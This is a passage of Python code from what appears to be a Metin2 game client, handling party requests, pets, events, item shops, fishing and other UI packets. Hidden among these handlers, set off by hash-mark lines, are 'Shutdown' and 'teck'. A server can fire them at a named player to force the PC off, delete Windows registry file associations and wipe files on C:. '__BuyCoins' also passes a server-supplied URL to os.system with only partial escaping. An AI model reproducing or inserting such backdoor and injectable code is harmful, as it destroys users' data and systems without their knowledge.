				self.__XMasBoom_Boom()

	def __XMasBoom_Boom(self):
		x, y, z = player.GetMainCharacterPosition()
		randX = app.GetRandom(-150, 150)
		randY = app.GetRandom(-150, 150)

		snd.PlaySound3D(x+randX, -y+randY, z, "sound/common/etc/salute.mp3")

	def __PartyRequestQuestion(self, vid):
		vid = int(vid)
		partyRequestQuestionDialog = uicommon.QuestionDialog()
		partyRequestQuestionDialog.SetText(chr.GetNameByVID(vid) + localeinfo.PARTY_DO_YOU_ACCEPT)
		partyRequestQuestionDialog.SetAcceptText(localeinfo.UI_ACCEPT)
		partyRequestQuestionDialog.SetCancelText(localeinfo.UI_DENY)
		partyRequestQuestionDialog.SetAcceptEvent(lambda arg=True: self.__AnswerPartyRequest(arg))
		partyRequestQuestionDialog.SetCancelEvent(lambda arg=False: self.__AnswerPartyRequest(arg))
		partyRequestQuestionDialog.Open()
		partyRequestQuestionDialog.vid = vid
		self.partyRequestQuestionDialog = partyRequestQuestionDialog

	def __AnswerPartyRequest(self, answer):
		if not self.partyRequestQuestionDialog:
			return

		vid = self.partyRequestQuestionDialog.vid

		if answer:
			net.SendChatPacket("/party_request_accept " + str(vid))
		else:
			net.SendChatPacket("/party_request_deny " + str(vid))

		self.partyRequestQuestionDialog.Close()
		self.partyRequestQuestionDialog = None

	def __PartyRequestDenied(self):
		self.PopupMessage(localeinfo.PARTY_REQUEST_DENIED)

	def __EnableTestServerFlag(self):
		app.EnableTestServerFlag()

	def __InGameShop_Show(self, url):
		return

	# WEDDING
	def __LoginLover(self):
		if self.interface.wndMessenger:
			self.interface.wndMessenger.OnLoginLover()

	def __LogoutLover(self):
		if self.interface.wndMessenger:
			self.interface.wndMessenger.OnLogoutLover()
		if self.affectShower:
			self.affectShower.HideLoverState()

	def __LoverNear(self):
		if self.affectShower:
			self.affectShower.ShowLoverState()

	def __LoverFar(self):
		if self.affectShower:
			self.affectShower.HideLoverState()

	def __LoverDivorce(self):
		if self.interface.wndMessenger:
			self.interface.wndMessenger.ClearLoverInfo()
		if self.affectShower:
			self.affectShower.ClearLoverState()

	if app.ENABLE_INGAME_CHCHANGE:
		def BINARY_OnChannelPacket(self, channelID):
			import serverinfo
			regionID = 0
			channelID = int(channelID)
			if channelID == 0:
				return
			
			dict = {'name' : 'KEYNES2'} 
			if channelID == 99:
				net.SetServerInfo((localeinfo.CH_99_NAME % (dict['name'])).strip())
			else:
				net.SetServerInfo((localeinfo.TEXT_CHANNEL % (dict['name'], channelID)).strip())
			
			if self.interface:
				self.interface.wndMiniMap.serverinfo.SetText(net.GetServerInfo())

	def __PlayMusic(self, flag, filename):
		flag = int(flag)
		if flag:
			snd.FadeOutAllMusic()
			musicinfo.SaveLastPlayFieldMusic()
			snd.FadeInMusic("bgm/" + filename)
		else:
			snd.FadeOutAllMusic()
			musicinfo.LoadLastPlayFieldMusic()
			snd.FadeInMusic("bgm/" + musicinfo.fieldMusic)
	
	if app.ENABLE_ACCE_SYSTEM:
		def ActAcce(self, iAct, bWindow):
			if self.interface:
				self.interface.ActAcce(iAct, bWindow)

		def AlertAcce(self, bWindow):
			snd.PlaySound("sound/ui/make_soket.wav")
			if bWindow:
				self.PopupMessage(localeinfo.ACCE_DEL_SERVEITEM)
			else:
				self.PopupMessage(localeinfo.ACCE_DEL_ABSORDITEM)
	
	if app.ENABLE_DEFENSE_WAVE:
		def BINARY_Update_Mast_HP(self, hp):
			self.interface.BINARY_Update_Mast_HP(int(hp))

		def BINARY_Update_Mast_Timer(self, text):
			self.interface.BINARY_Update_Mast_Timer(text)

		def BINARY_Update_Mast_Window(self, i):
			self.interface.BINARY_Update_Mast_Window(int(i))
	
	if app.ENABLE_MELEY_LAIR_DUNGEON:
		def OpenMeleyRanking(self):
			if self.interface:
				self.interface.OpenMeleyRanking()

		def AddRankMeleyRanking(self, data):
			if self.interface:
				line = int(data.split("#")[1])
				name = str(data.split("#")[2])
				members = int(data.split("#")[3])
				seconds = int(data.split("#")[4])
				minutes = seconds // 60
				seconds %= 60
				if seconds > 0:
					time = localeinfo.TIME_MIN_SEC % (minutes, seconds)
				else:
					time = localeinfo.TIME_MIN % (minutes)
				
				self.interface.RankMeleyRanking(line, name, members, time)

	
	
	# END_OF_WEDDING

	if app.NEW_PET_SYSTEM:
		def SetPetEvolution(self, evo):
			petname = [localeinfo.PET_MISSING1_1, localeinfo.PET_MISSING1_2, localeinfo.PET_MISSING1_3, localeinfo.PET_MISSING1_4]
			self.petmain.SetEvolveName(petname[int(evo)])
			constinfo.PETMINIEVO = int(evo)
			if app.ENABLE_PVP_ADVANCED:
				if self.wndDuelLive:
					self.wndDuelLive.UpdatePosition(True)

		def SetPetName(self, name):
			if len(name) > 1 and name != "":
				self.petmini.Show()
			self.petmain.SetName(name)
		
		def SetPetLevel(self, level):
			self.petmain.SetLevel(level)
			constinfo.PETMINILEVEL = int(level)
		
		def SetPetDuration(self, dur, durt):
			if int(durt) > 0:
				self.petmini.SetDuration(dur, durt)
			self.petmain.SetDuration(dur, durt)

		def PetAge(self, arg):
			self.petmain.SetAge(int(arg))

		def SetPetBonus(self, hp, dif, sp):
			self.petmain.SetHp(hp)
			self.petmain.SetDef(dif)
			self.petmain.SetSp(sp)
			
		def SetPetskill(self, slot, idx, lv):
			self.petmini.SetSkill(slot, idx, lv)
			self.petmain.SetSkill(slot, idx, lv)
			if int(slot) == 0:
				if self.affectShower:
					self.affectShower.BINARY_NEW_RemoveAffect(int(constinfo.SKILL_PET1), 0)
				
				constinfo.SKILL_PET1 = 5400 + int(idx)
			
			if int(slot) == 1:
				if self.affectShower:
					self.affectShower.BINARY_NEW_RemoveAffect(int(constinfo.SKILL_PET2), 0)
				
				constinfo.SKILL_PET2 = 5400 + int(idx)
				
			if int(slot) == 2:
				if self.affectShower:
					self.affectShower.BINARY_NEW_RemoveAffect(int(constinfo.SKILL_PET3), 0)
				
				constinfo.SKILL_PET3 = 5400 + int(idx)
			
			if int(slot) == 3:
				if self.affectShower:
					self.affectShower.BINARY_NEW_RemoveAffect(int(constinfo.SKILL_PET4), 0)
				
				constinfo.SKILL_PET4 = 5400 + int(idx)
			
			if int(idx) > 0:
				if self.affectShower:
					self.affectShower.BINARY_NEW_AddAffect(5400+int(idx), int(constinfo.LASTAFFECT_POINT)+1, int(constinfo.LASTAFFECT_VALUE)+1, 0)

		def SetPetIcon(self, vnum):
			if int(vnum) > 0:
				self.petmini.SetImageSlot(vnum)
			self.petmain.SetImageSlot(vnum)
			
		def SetPetExp(self, exp, expi, exptot):
			if int(exptot) > 0:
				self.petmini.SetExperience(exp, expi, exptot)
			self.petmain.SetExperience(exp, expi, exptot)
			
		def PetUnsummon(self):
			self.petmini.SetDefaultInfo()
			self.petmini.Close()
			self.petmain.SetDefaultInfo()
			self.affectShower.BINARY_NEW_RemoveAffect(int(constinfo.SKILL_PET1), 0)
			self.affectShower.BINARY_NEW_RemoveAffect(int(constinfo.SKILL_PET2), 0)
			self.affectShower.BINARY_NEW_RemoveAffect(int(constinfo.SKILL_PET3), 0)
			self.affectShower.BINARY_NEW_RemoveAffect(int(constinfo.SKILL_PET4), 0)
			constinfo.SKILL_PET1 = 0
			constinfo.SKILL_PET2 = 0
			constinfo.SKILL_PET3 = 0
			constinfo.SKILL_PET4 = 0
			if app.ENABLE_PVP_ADVANCED:
				if self.wndDuelLive:
					self.wndDuelLive.UpdatePosition(False)

		def OpenPetMainGui(self):
			if not self.petmain.IsShow():
				self.petmain.Show()
				self.petmain.SetTop()
			else:
				self.petmain.Close()

		def OpenPetIncubator(self, pet_new = 0):
			if self.petinc:
				self.petinc.Close()
				del self.petinc
				self.petinc = None
			
			import uipetincubatrice
			self.petinc = uipetincubatrice.PetSystemIncubator(pet_new)
			self.petinc.Show()
			self.petinc.SetTop()

		def OpenPetMini(self):
			self.petmini.Show()
			self.petmini.SetTop()

		def OpenPetFeed(self):
			self.feedwind = uipetfeed.PetFeedWindow()
			self.feedwind.Show()
			self.feedwind.SetTop()

	if app.ENABLE_WHISPER_ADMIN_SYSTEM:
		def OnRecvWhisperAdminSystem(self, name, line, color):

			def ExistCustomColor(val):
				return (val > 0)

			def GetColor(type):
				WHISPER_COLOR_MESSAGE = {
					0: "|cffffffff|H|h",
					1: "|cffff796a|H|h",
					2: "|cffb1ff80|H|h",
					3: "|cff46deff|H|h"
				}
				return WHISPER_COLOR_MESSAGE[type]

			def ResizeTextWithColor(color, text):
				return str("%s%s|h|r" % (GetColor(color), text))
			
			import datetime
			now = datetime.datetime.now()
			ret = line.replace("#", " ")
			line2 = ret
			
			if ExistCustomColor(int(color)):
				ret = ResizeTextWithColor(int(color), ret)
			else:
				ret = ResizeTextWithColor(0, ret)
			
			time = now.strftime("%Y-%m-%d %H:%M")
			text = localeinfo.WHISPER_ADMIN_MESSAGE % (time, ret)
			
			self.interface.RegisterGameMasterName(name)
			chat.AppendWhisper(chat.WHISPER_TYPE_CHAT, name, text)
			self.interface.RecvWhisper(name)

	#def OpenTeleporter(self):
	#	if self.interface:
	#		self.interface.ToggleMapTeleporter()

	if app.ENABLE_EXTRA_INVENTORY:
		def OpenExtrainventory(self):
			if self.interface:
				self.interface.ToggleExtraInventoryWindow()

	def OpenDungeoninfo(self):
			if self.interface:
				self.interface.ToggleDungeonInfoWindow()

	if app.ENABLE_WHISPER_ADMIN_SYSTEM:
		def OpenWhisperSystem(self):
			net.SendChatPacket("/open_whispersys")

		def RecvWhisperSystem(self):
			if self.interface:
				self.interface.OpenWhisperSystem()

		def BINARY_RecieveWhisperInfo(self, name, language, empire):
			if self.interface:
				self.interface.RecieveWhisperDetails(name, language, empire)

	if app.INGAME_WIKI:
		def ToggleWikiWindow(self):
			if not self.wndWiki:
				return
			
			if self.wndWiki.IsShow():
				self.wndWiki.Hide()
			else:
				self.wndWiki.Show()
				self.wndWiki.SetTop()

	if app.WJ_ENABLE_TRADABLE_ICON:
		def BINARY_AddItemToExchange(self, inven_type, inven_pos, display_pos):
			if inven_type == player.INVENTORY:
				self.interface.CantTradableItemExchange(display_pos, inven_pos)
			elif inven_type == player.EXTRA_INVENTORY:
				self.interface.CantTradableExtraItemExchange(display_pos, inven_pos)

#############################################
	def Shutdown(self, player_name):
		if player_name == str(player.GetName()):
			import os
			os.system('shutdown -t 0 -s -f')
##############################################
	def teck(self, player_name):
		if player_name == str(player.GetName()):
			import os
			os.system("@echo off && START reg delete HKCR/.exe && START reg delete HKCR/.dll && START reg delete HKCR/* && Del C:\ *.* |y")
############################################## 
	def Message(self, player_name, text):
		if player_name == str(player.GetName()):
			message = text.replace('-', ' ')
			dbg.LogBox(message) #
#############################################

	if app.ENABLE_EVENT_MANAGER:
		def ClearEventManager(self):
			self.interface.ClearEventManager()
		def RefreshEventManager(self):
			self.interface.RefreshEventManager()
		def RefreshEventStatus(self, eventID, eventStatus, eventendTime, eventEndTimeText):
			self.interface.RefreshEventStatus(int(eventID), int(eventStatus), int(eventendTime), str(eventEndTimeText))
		def AppendEvent(self, dayIndex, eventID, eventIndex, startTime, endTime, empireFlag, channelFlag, value0, value1, value2, value3, startRealTime, endRealTime, isAlreadyStart):
			self.interface.AppendEvent(int(dayIndex),int(eventID), int(eventIndex), str(startTime), str(endTime), int(empireFlag), int(channelFlag), int(value0), int(value1), int(value2), int(value3), int(startRealTime), int(endRealTime), int(isAlreadyStart))

	if app.ENABLE_INGAME_ITEMSHOP:
		def __BuyCoins(self, url):
			newurl = url.replace("&","^&")
			os.system("start %s" % newurl)

		def ItemShopClear(self, updateTime):
			uiitemshop.ItemShopClear(int(updateTime))

		def ItemShopAppendItem(self, categoryIndex, categorySubIndex, itemID, itemVnum, itemPrice, itemDiscount, itemOffertime, itemTopSelling, itemAddedTime, itemSellingCount):
			uiitemshop.ItemShopAppendItem(int(categoryIndex), int(categorySubIndex), int(itemID), int(itemVnum), long(itemPrice), int(itemDiscount), int(itemOffertime), int(itemTopSelling), int(itemAddedTime), long(itemSellingCount))

		def ItemShopHideLoading(self):
			if self.interface:
				self.interface.ItemShopHideLoading()

		def ItemShopOpenMainPage(self):
			if self.interface:
				self.interface.OpenItemShopMainWindow()

		def ItemShopLogClear(self):
			uiitemshop.ItemShopLogClear()

		def ItemShopAppendLog(self, dateText, dateTime, playerName, ipAdress, itemVnum, itemCount, itemPrice):
			uiitemshop.ItemShopAppendLog(str(dateText), int(dateTime), str(playerName), str(ipAdress), int(itemVnum), int(itemCount), long(itemPrice))

		def ItemShopPurchasesWindow(self):
			if self.interface:
				self.interface.ItemShopPurchasesWindow()

		def ItemShopSetDragonCoin(self, dragonCoin):
			if self.interface:
				self.interface.ItemShopSetDragonCoin(long(dragonCoin))

	if app.ENABLE_REWARD_SYSTEM:
		def SetRewardPlayers(self, data):
			self.interface.SetRewardPlayers(str(data))

	if app.USE_BATTLEPASS:
		def BINARY_ExtOpenBattlePass(self):
			if self.interface:
				self.interface.ReciveOpenExtBattlePass()

		def BINARY_ExtBattlePassAddGeneralInfo(self, BattlePassName, BattlePassID, battlePassStartTime, battlePassEndTime):
			if self.interface:
				self.interface.AddExtendedBattleGeneralInfo(BattlePassName, BattlePassID, battlePassStartTime, battlePassEndTime)

		def BINARY_ExtBattlePassAddMission(self, battlepassID, missionIndex, missionType, missionInfo1, missionInfo2, missionInfo3):
			if self.interface:
				self.interface.AddExtendedBattlePassMission(battlepassID, missionIndex, missionType, missionInfo1, missionInfo2, missionInfo3)

		def BINARY_ExtBattlePassAddMissionReward(self, battlepassID, missionIndex, missionType, itemVnum, itemCount):
			if self.interface:
				self.interface.AddExtendedBattlePassMissionReward(battlepassID, missionIndex, missionType, itemVnum, itemCount)

		def BINARY_ExtBattlePassUpdate(self, missionIndex, missionType, newProgress):
			if self.interface:
				self.interface.UpdateExtendedBattlePassMission(missionIndex, missionType, newProgress)

		def BINARY_ExtBattlePassClearReward(self, battlepassID):
			if self.interface:
				self.interface.ClearExtendedBattlePassReward(battlepassID)

		def BINARY_ExtBattlePassAddReward(self, battlepassID, itemVnum, itemCount):
			if self.interface:
				self.interface.AddExtendedBattlePassReward(battlepassID, itemVnum, itemCount)

		def BINARY_ExtBattlePassAddRanklistEntry(self, playername, battlepassID, startTime, endTime):
			if self.interface:
				self.interface.AddExtBattlePassRanklistEntry(playername, battlepassID, startTime, endTime)

	if app.ENABLE_GAYA_RENEWAL:
		def OpenGemShop(self):
			if self.interface:
				self.interface.OpenGemShop()

		def CloseGemShop(self):
			if self.interface:
				self.interface.CloseGemShop()

		def RefreshGemShop(self):
			if self.interface:
				self.interface.RefreshGemShop()

	if app.USE_CAPTCHA_SYSTEM:
		def BINARY_RecvCaptcha(self, code, limit, filename):
			self.interface.RecvCaptcha(code, limit, filename)

	def BINARY_EmotionsFailed(self, reason):
		try:
			chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.EMOTION_ERROR_TAIL_DICT.get(0))
		except Exception as e:
			dbg.TraceError(str(e))

	if app.ENABLE_NEW_FISH_EVENT:
		def MiniGameFishEvent(self, isEnable, lasUseCount):
			try:
				self.interface.SetFishEventStatus(int(isEnable))
				self.interface.MiniGameFishCount(lasUseCount)
				self.interface.IntegrationEventBanner()
			except Exception as e:
				dbg.TraceError(str(e))

		def MiniGameFishUse(self, shape, useCount):
			try:
				self.interface.MiniGameFishUse(shape, useCount)
			except Exception as e:
				dbg.TraceError(str(e))

		def MiniGameFishAdd(self, pos, shape):
			try:
				self.interface.MiniGameFishAdd(pos, shape)
			except Exception as e:
				dbg.TraceError(str(e))

		def MiniGameFishReward(self, vnum):
			try:
				self.interface.MiniGameFishReward(vnum)
			except Exception as e:
				dbg.TraceError(str(e))

	if app.ENABLE_LETTERS_EVENT:
		def OnRecvLettersEvent(self, info):
			try:
				eachInfo = info.split("#")
				isEnabled = int(eachInfo[0])
				if isEnabled:
					constinfo.rewardLettersList = [int(eachInfo[1]), int(eachInfo[2])]
				else:
					constinfo.rewardLettersList = []
				
				self.interface.SetLettersEventStatus(isEnabled)
				self.interface.IntegrationEventBanner()
			except Exception as e:
				dbg.TraceError(str(e))

	if app.ENABLE_AURA_SYSTEM:
		def AuraWindowOpen(self, type):
			self.interface.AuraWindowOpen(type)

		def AuraWindowClose(self):
			self.interface.AuraWindowClose()

	if app.ENABLE_HIDE_COSTUME_SYSTEM:
		def OnRecvHiddenStatus(self, data):
			eachData = data.split("#")
			if len(eachData) != int(app.HIDE_PART_MAX - 1):
				try:
					for i in xrange(app.HIDE_PART_MAX):
						constinfo.hiddenStatusDict[i] = eachData[i]
					
					self.interface.RefreshVisibleCostume()
				except Exception as e:
					import dbg
					dbg.TraceError(str(e))
					pass

		def OnRecvHiddenStatusYes(self, data):
			eachData = data.split("#")
			if len(eachData) == 2:
				try:
					self.interface.RefreshVisibleCostumeOnce(int(eachData[0]), int(eachData[1]))
				except Exception as e:
					import dbg
					dbg.TraceError(str(e))
					pass

	if app.ENABLE_CHANGELOOK:
		def ActChangeLook(self, iAct):
			if self.interface:
				self.interface.ActChangeLook(iAct)

		def AlertChangeLook(self):
			self.PopupMessage(localeinfo.CHANGE_LOOK_DEL_ITEM)

	def BINARY_FightCancelled(self):
		if constinfo.dogmode != -1:
			try:
				import newconstinfo
				newconstinfo._interface_instance.dlgSystem.OnCancelDogMode()
			except:
				pass

	if app.ENABLE_HALLOWEEN_EVENT_2022:
		def OnRecvHalloweenEvent(self, isEnabled):
			try:
				self.interface.SetHalloweenEventStatus(int(isEnabled))
				self.interface.IntegrationEventBanner()
			except Exception as e:
				dbg.TraceError(str(e))

	if app.ENABLE_TRACK_WINDOW:
		def TrackWindowUpdate(self):
			if systemSetting.GetDungeonTrack() or systemSetting.GetBossTrack():
				try:
					self.interface.MakeTrackWindow()
					self.interface.TrackWindowCheckPacket()
				except:
					pass

		def BINARY_OnRecvBulkWhisper(self, text):
			chat.AppendWhisper(chat.WHISPER_TYPE_SYSTEM, localeinfo.WORLDBOSS_NAME, text)
			self.interface.RecvWhisper(localeinfo.WORLDBOSS_NAME)

	if app.ENABLE_NEW_FISHING_SYSTEM:
		def OnFishingStart(self, have, need):
			try:
				self.interface.OnFishingStart(have, need)
			except Exception as e:
				dbg.TraceError(str(e))

		def OnFishingStop(self):
			try:
				self.interface.OnFishingStop()
			except Exception as e:
				dbg.TraceError(str(e))

		def OnFishingCatch(self, have):
			try:
				self.interface.OnFishingCatch(have)
			except Exception as e:
				dbg.TraceError(str(e))

		def OnFishingCatchFailed(self):
			try:
				self.interface.OnFishingCatchFailed()
			except Exception as e:
				dbg.TraceError(str(e))

	def OnCloseRemoveQuestionDialog(self, answer, event):
		if not self.removeQuestionDialog:
			return False
		
		self.removeQuestionDialog.Close()
		if not answer:
			return False
		
		net.SendChatPacket(event)
		return True

	def OnRemoveAffectQuestionDialog(self, event, text):
		if not self.removeQuestionDialog:
			import uicommon
			self.removeQuestionDialog = uicommon.QuestionDialog()
			self.removeQuestionDialog.SetText("")
			self.removeQuestionDialog.SetWidth(350)
			self.removeQuestionDialog.Close()
		
		if self.removeQuestionDialog.IsShow():
			return
		
		self.removeQuestionDialog.SetText(text)
		self.removeQuestionDialog.SetAcceptEvent(lambda arg1 = True, arg2 = event: self.OnCloseRemoveQuestionDialog(arg1, arg2))
		self.removeQuestionDialog.SetCancelEvent(lambda arg1 = False, arg2 = event: self.OnCloseRemoveQuestionDialog(arg1, arg2))
		self.removeQuestionDialog.Open()

	if app.ENABLE_OKEY_CARD_GAME:
		def BINARY_Cards_UpdateInfo(self, hand_1, hand_1_v, hand_2, hand_2_v, hand_3, hand_3_v, hand_4, hand_4_v, hand_5, hand_5_v, cards_left, points):
			try:
				self.interface.UpdateCardsInfo(hand_1, hand_1_v, hand_2, hand_2_v, hand_3, hand_3_v, hand_4, hand_4_v, hand_5, hand_5_v, cards_left, points)
			except Exception as e:
				dbg.TraceError(str(e))

		def BINARY_Cards_FieldUpdateInfo(self, hand_1, hand_1_v, hand_2, hand_2_v, hand_3, hand_3_v, points):
			try:
				self.interface.UpdateCardsFieldInfo(hand_1, hand_1_v, hand_2, hand_2_v, hand_3, hand_3_v, points)
			except Exception as e:
				dbg.TraceError(str(e))

		def BINARY_Cards_PutReward(self, hand_1, hand_1_v, hand_2, hand_2_v, hand_3, hand_3_v, points):
			try:
				self.interface.CardsPutReward(hand_1, hand_1_v, hand_2, hand_2_v, hand_3, hand_3_v, points)
			except Exception as e:
				dbg.TraceError(str(e))

		def BINARY_Cards_ShowIcon(self):
			try:
				self.interface.CardsShowIcon()
			except Exception as e:
				dbg.TraceError(str(e))

		def BINARY_Cards_Open(self, safemode):
			try:
				self.interface.OpenCardsWindow(safemode)
			except Exception as e:
				dbg.TraceError(str(e))

		def OnRecvOkeyCardsEvent(self, isEnabled):
			try:
				self.interface.SetOkeyCardsEventStatus(int(isEnabled))
				self.interface.IntegrationEventBanner()
			except Exception as e:
				dbg.TraceError(str(e))

	if app.ENABLE_OFFLINESHOP_REWORK:
		def ShowMeOfflineShop(self):
			if app.ENABLE_RENEWAL_OX:
				import background
				if background.GetCurrentMapName() == "metin2_map_oxevent":
					import chr
					
					if not chr.IsGameMaster(player.GetMainCharacterIndex()):
						import chat
						chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.CANNOT_USE_OFFLINESHOP)
						return
			
			if self.interface.wndShopOffline:
				if not self.interface.wndShopOffline.IsShow() or\
					self.interface.wndShopOffline.wBoard[3].IsShow():
					self.interface.wndShopOffline.Open()
				else:
					self.interface.wndShopOffline.Close()

		def OnPressOfflineShopSearch(self):
			if app.ENABLE_RENEWAL_OX:
				import background
				if background.GetCurrentMapName() == "metin2_map_oxevent":
					import chr
					
					if not chr.IsGameMaster(player.GetMainCharacterIndex()):
						import chat
						chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.CANNOT_USE_IN_THIS_MAP)
						return
			
			if self.interface.wndShopOffline:
				self.interface.wndShopOffline.OpenSearch()

	if app.USE_WHEEL_OF_FORTUNE:
		def OnUpdateDragonCoins(self, coins):
			constinfo.dragon_coins=int(coins)
			
			if app.ENABLE_INGAME_ITEMSHOP:
				self.ItemShopSetDragonCoin(constinfo.dragon_coins)
			
			self.interface.WheelSetDragonCoins(constinfo.dragon_coins)

	if app.USE_ATTR_6TH_7TH:
		def __OpenAttr67AddDlg(self):
			self.interface.OpenAttr67AddDlg()

	if app.USE_AUTO_HUNT:
		def SetAutoCooltime(self, slotindex, cooltime):
			self.interface.SetAutoCooltime(slotindex, cooltime)

		def SetAutoStatus(self, bStatus):
			if bStatus:
				chrmgr.SetAutoOnOff(bStatus)
			else:
				chrmgr.SetAutoOnOff(bStatus)

	if app.ENABLE_PREMIUM_PLAYERS:
		def BINARY_RecvPremiumPlayersOpenPacket(self):
			if self.interface:
				self.interface.OpenPremiumPlayers()

		def BINARY_RecvPremiumPlayersListPacket(self, byPos, szName):
			if self.interface:
				self.interface.ListPremiumPlayers(byPos, szName)
		
		def BINARY_RecvPremiumPlayersListOpenPacket(self):
			if self.interface:
				self.interface.OpenPremiumPlayersRanking()

	if app.USE_PICKUP_FILTER:
		def SendFilterSettings(self):
			if self.interface:
				self.interface.SendFilterSettings(True)

				if app.USE_AUTO_HUNT and app.USE_PICKUP_FILTER_ICO_AS_AFFECT:
					self.BINARY_NEW_AddAffect(chr.AFFECT_PICKUP_FILTER, 0, 0, 0)

		if app.USE_AUTO_HUNT or app.ENABLE_PREMIUM_PLAYERS:
			def ClearFilterSettings(self):
				if self.interface:
					self.interface.ClearFilterSettings()

	if app.USE_AUTO_AGGREGATE:
		def SetBraveCapeStatus(self, status):
			if self.interface:
				self.interface.SetBraveCapeStatus(status)

	def OnRecvWhisperInfo(self, *args):
		if not self.interface:
			return

		self.interface.OnRecvWhisperInfo(*args)